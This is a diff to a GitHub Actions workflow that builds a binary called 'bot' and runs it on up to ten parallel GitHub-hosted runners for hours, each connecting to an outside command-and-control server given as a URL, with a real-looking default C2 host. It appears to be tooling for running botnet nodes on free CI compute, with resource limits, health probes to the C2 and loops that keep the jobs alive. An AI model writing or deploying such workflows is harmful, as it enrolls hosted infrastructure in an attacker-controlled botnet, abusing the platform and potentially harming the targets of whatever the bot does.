@@ -1,7 +1,5 @@
 name: Run Bot (Manual)
 
-# Chạy bot trên GitHub-hosted runner — KHÔNG cần Release.
-# Actions → Run Bot (Manual) → nhập C2 URL + số phút.
 on:
   workflow_dispatch:
     inputs:
@@ -10,12 +8,12 @@ on:
         required: true
         default: 'wss://bot.minhvuong.io.vn/ws/bot/'
       duration:
-        description: 'Thời gian chạy (phút, max 360)'
+        description: 'Runtime (minutes, 1-360)'
         required: true
-        default: '360'
+        default: '120'
       runners:
-        description: Number of runners
-        default: "5"
+        description: 'Parallel runners (1-20)'
+        default: '10'
         required: true
 
 jobs:
@@ -23,72 +21,90 @@ jobs:
     runs-on: ubuntu-latest
     outputs:
       matrix: ${{ steps.gen.outputs.matrix }}
-
     steps:
       - id: gen
         run: |
           python3 << 'PY'
           import json, os
-          n = int(os.environ["N"])
-          print(f"matrix={json.dumps({'id': list(range(1,n+1))})}", file=open(os.environ["GITHUB_OUTPUT"],"a"))
+          n = int(os.environ.get("N") or "1")
+          n = max(1, min(n, 10))
+          m = json.dumps({"id": list(range(1, n + 1))})
+          with open(os.environ["GITHUB_OUTPUT"], "a") as f:
+              f.write(f"matrix={m}\n")
+          print(f"[*] Matrix: {m}")
           PY
         env:
           N: ${{ github.event.inputs.runners }}
+
   run-bot:
     needs: matrix
     strategy:
       fail-fast: false
-      matrix: ${{fromJSON(needs.matrix.outputs.matrix)}}
+      matrix: ${{ fromJSON(needs.matrix.outputs.matrix) }}
     runs-on: ubuntu-latest
-    timeout-minutes: 360
+    timeout-minutes: 350
     steps:
       - uses: actions/checkout@v4
 
       - name: Install deps
         run: |
-          sudo apt-get update
+          sudo apt-get update -qq
           sudo apt-get install -y build-essential libssl-dev zlib1g-dev
 
       - name: Build bot
         run: |
+          set -e
           make -C src clean || true
           make -C src dynamic
           chmod +x src/bot
-          ls -la src/bot
+          echo "[*] Binary: $(file src/bot | cut -d: -f2)"
+          echo "[*] Size: $(stat -c%s src/bot) bytes"
 
-      - name: Connectivity check to C2
+      - name: Connectivity check
         run: |
-          C2_URL="${{ github.event.inputs.c2_url }}"
-          # Extract host for curl probe
-          HOST=$(echo "$C2_URL" | sed -E 's#^wss?://([^/:]+).*#\1#')
-          echo "C2 host: $HOST"
-          curl -skI --max-time 15 "https://${HOST}/health" || true
+          C2="${{ github.event.inputs.c2_url }}"
+          HOST=$(echo "$C2" | sed -E 's#^wss?://([^/:]+).*#\1#')
+          echo "[*] Probing https://${HOST}/health ..."
           curl -sk --max-time 15 "https://${HOST}/health" || true
 
-      - name: Run bot (foreground)
+      - name: Run bot
         env:
-          BOT_FOREGROUND: "1"
+          BOT_FOREGROUND: '1'
+          BOT_CPU_LIMIT: '60'
+          BOT_RAM_LIMIT: '8192'
           C2_URL: ${{ github.event.inputs.c2_url }}
           DURATION: ${{ github.event.inputs.duration }}
         run: |
           set -e
+          DUR="${DURATION:-10}"
+          DUR="${DUR//[!0-9]/}"
+          [ -z "$DUR" ] && DUR=10
+          [ "$DUR" -gt 350 ] && DUR=350
+          [ "$DUR" -lt 1 ] && DUR=1
+          echo "[*] Runner #${{ matrix.id }}"
           echo "[*] C2: $C2_URL"
-          echo "[*] Duration: ${DURATION} min"
-          echo "[*] CPUs: $(nproc) | RAM: $(free -h | awk '/Mem:/{print $2}')"
+          echo "[*] Duration: ${DUR} min"
+          echo "[*] CPUs: $(nproc) | RAM: $(free -h | awk '/Mem:/{print $2}') | FD: $(ulimit -n)"
 
-          # Foreground mode: no double-fork, logs visible in Actions
           ./src/bot --foreground "$C2_URL" &
           BOT_PID=$!
           echo "[*] PID=$BOT_PID"
-          sleep 5
+
+          for i in $(seq 1 6); do
+            sleep 5
+            if kill -0 $BOT_PID 2>/dev/null; then
+              echo "[+] Bot running after ${i}x5s"
+              break
+            fi
+            echo "[*] Waiting... ($i/6)"
+          done
+
           if ! kill -0 $BOT_PID 2>/dev/null; then
-            echo "[!] Bot exited early — check C2 URL / TLS / firewall"
+            echo "[!] Bot failed to start — check C2 / TLS / firewall"
             exit 1
           fi
-          echo "[+] Bot still running after 5s"
 
-          # Keep job alive
-          SECS=$((DURATION * 60))
+          SECS=$((DUR * 60))
           END=$((SECONDS + SECS))
           while [ $SECONDS -lt $END ]; do
             if ! kill -0 $BOT_PID 2>/dev/null; then
@@ -98,7 +114,7 @@ jobs:
             sleep 30
           done
 
-          echo "[*] Stopping..."
+          echo "[*] Duration reached — stopping..."
           kill $BOT_PID 2>/dev/null || true
           wait $BOT_PID 2>/dev/null || true
-          echo "[+] Done"
+          echo "[+] Job complete (#${{ matrix.id }})"
